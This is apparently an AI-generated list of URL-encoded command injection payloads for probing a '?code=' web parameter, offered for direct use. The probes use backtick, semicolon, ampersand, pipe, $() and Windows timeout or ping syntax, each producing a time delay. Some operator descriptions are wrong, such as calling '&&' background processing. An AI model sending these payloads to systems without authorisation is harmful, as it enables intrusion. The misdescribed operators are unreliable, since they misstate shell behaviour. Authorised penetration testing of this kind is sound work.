When testing an application parameter like ?code= for potential command injection vulnerabilities, security professionals use a variety of non-destructive operators. This is because different operating systems (Linux vs. Windows) and different backend command structures require different shell syntax to execute a nested command. [1] 
Here is a comprehensive list of non-destructive payloads categorized by the operator style, formatted for direct use after the equals sign.
## 1. Backtick Operators (Inline Execution)
These are used when the input is placed inside an existing command string. The shell executes the command inside the backticks first. [2, 3] 

* Linux / Windows: %60sleep+5%60
* With a placeholder value: test%60sleep+5%60

## 2. Semicolon Operators (Command Separation)
The semicolon terminates the intended command and instructs the shell to run the next command sequentially. (Primarily Linux). [4, 5] 

* Standard sequential execution: test%3Bsleep+5
* With a trailing comment to ignore the rest of the original script: test%3Bsleep+5%3B%23

## 3. Logical Operators (AND / OR)
These determine whether the second command runs based on the success or failure of the first command. [6, 7] 

* Sequential execution regardless of outcome (Ampersand): test%26sleep+5
* Background processing (Double Ampersand / Linux): test%26%26sleep+5
* Execution if the first part fails (Double Pipe): test%7C%7Csleep+5 [8] 

## 4. Command Substitution (POSIX Syntax)
Modern shells often use $() instead of backticks for nesting commands. (Primarily Linux). [9] 

* Standard substitution: test%24%28sleep+5%29

## 5. Windows PowerShell / CMD Specifics
If the backend server is running Windows instead of Linux, the sleep command does not exist. Instead, timeout or ping is used to create a non-destructive time delay. [10, 11, 12] 

* Using Timeout (Windows): test%26timeout+/t+5
* Using Ping loopback (Windows): test%26ping+-n+5+127.0.0.1

